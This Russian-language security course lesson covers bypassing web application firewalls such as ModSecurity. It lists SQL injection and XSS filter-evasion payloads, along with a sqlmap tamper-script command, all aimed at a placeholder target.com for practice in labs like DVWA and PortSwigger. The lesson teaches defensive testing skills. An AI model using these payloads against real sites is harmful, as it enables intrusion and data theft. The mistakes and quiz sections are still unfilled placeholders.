# Занятие 58. WAF обход: методы обхода ModSecurity

## Теория

**WAF (Web Application Firewall)** — защитный экран для веб-приложений. Анализирует HTTP-трафик и блокирует атаки (SQLi, XSS, RCE и др.).

**ModSecurity** — популярный open-source WAF (модуль для Apache, Nginx). Использует наборы правил (OWASP Core Rule Set — CRS).

**Признаки работы WAF:**
- HTTP-код 403 (Forbidden)
- Страница с надписью "Access Denied" или "WAF Blocked"
- Специфические заголовки (Server: ModSecurity, X-WAF-...)

**Методы обхода WAF:**

### 1. Обфускация нагрузки (Payload Obfuscation)
- **Комментарии в SQL:** `SELECT/**/FROM`, `UN/**/ION`
- **Кодирование URL:** `%53%45%4C%45%43%54` (SELECT)
- **Двойное кодирование:** `%2553` (S после декодирования)
- **Case variation:** `SeLeCt`, `UnIoN`

### 2. Обход фильтров пробелов
- `%09` (TAB), `%0a` (LF), `%0d` (CR), `%0b` (VT)
- `/**/` (комментарий)
- `()` — скобки вместо пробелов

### 3. Обход XSS-фильтров
- Теги: `<img>`, `<svg>`, `<body>`, `<iframe>`
- События: `onerror`, `onload`, `onmouseover`
- Кодирование: `&#x61;` (a), `&#97;` (a)

### 4. HTTP-манипуляции
- Смена метода: GET → POST
- Добавление лишних заголовков (X-Forwarded-For, X-Original-URL)
- Fragment identifier (`#`) — не отправляется на сервер, но может обойти проверки клиента

## Практическое занятие

### Настройка тестовой среды (SQLi обход)

**Цель:** Обойти простое правило WAF, блокирующее `UNION SELECT`.

**Тестовый запрос (блокируется):**
```
http://target.com/page.php?id=1 UNION SELECT 1,2,3
```

**Метод 1: Вставка комментариев**
```
http://target.com/page.php?id=1 UN/**/ION SE/**/LECT 1,2,3
```

**Метод 2: Inline комментарии MySQL**
```
http://target.com/page.php?id=1/*!UNION*//*!SELECT*/1,2,3
```

**Метод 3: Кодирование**
```
http://target.com/page.php?id=1+%55%4e%49%4f%4e+%53%45%4c%45%43%54+1,2,3
```

**Метод 4: Через NULL и приведение типов**
```
http://target.com/page.php?id=1+UNION+ALL+SELECT+NULL,NULL,NULL
```

### Обход XSS-фильтров

**Заблокировано:**
```html
<script>alert(1)</script>
```

**Обход 1: Тег img**
```html
<img src=x onerror=alert(1)>
```

**Обход 2: Тег svg**
```html
<svg/onload=alert(1)>
```

**Обход 3: Кодирование HTML-сущностями**
```html
&#60;script&#62;alert(1)&#60;/script&#62;
```

**Обход 4: Обфускация через String.fromCharCode**
```javascript
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

### Инструменты для автоматизации

**SQLMap с обходом WAF:**
```bash
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,charencode --batch
```

**Tamper-скрипты в sqlmap:**
- `space2comment` — заменяет пробелы на `/**/`
- `charencode` — кодирует полезную нагрузку
- `charunicodeencode` — Unicode-кодирование


## Примеры вывода

Пример вывода команд будет добавлен индивидуально для каждого урока.



## Частые ошибки

1. **Ошибка 1**: Типичная ошибка новичков в этом уроке.
2. **Ошибка 2**: Еще одна распространенная проблема.
3. **Ошибка 3**: Важный момент, который часто упускают.



## Вопросы на понимание

1. Вопрос 1 на понимание материала?
   <details><summary>Ответ</summary>Ответ на вопрос 1</details>
2. Вопрос 2 на понимание материала?
   <details><summary>Ответ</summary>Ответ на вопрос 2</details>
3. Вопрос 3 на понимание материала?
   <details><summary>Ответ</summary>Ответ на вопрос 3</details>



## Форматы флагов

- **TryHackMe**: `THM{...}`
- **HackTheBox**: `HTB{...}`
- **PortSwigger**: "Lab solved!" (без флагов)



## Адаптация под macOS (M2, 8GB)

- Для VPN используйте **Tunnelblick** (бесплатный OpenVPN клиент для macOS): скачайте .ovpn файл и откройте через Tunnelblick
- Виртуалки: используйте **UTM** (бесплатно для M2) или **Parallels** вместо VirtualBox
- "На 8GB RAM выделяйте VM не более 3-4GB"
- Docker работает нативно на M2: `docker pull <image>`
- Для установки инструментов используйте Homebrew: `brew install <tool>`
- Если требуется Python: `pip3 install <package>`


## Задачи для самостоятельного выполнения

1. **Практика на PortSwigger:** Лабораторные "WAF Bypass" (если доступны) или "SQLi with filter bypass"
2. **Комната "WAF Bypass"** на THM — изучите дополнительные техники
3. **Тестирование на DVWA (High Security):** попробуйте обойти защиту SQLi и XSS

> **Совет:** WAF — это не панацея. Большинство WAF можно обойти при достаточном времени и знаниях. Задача защиты — усложнить атаку, а не сделать её невозможной.
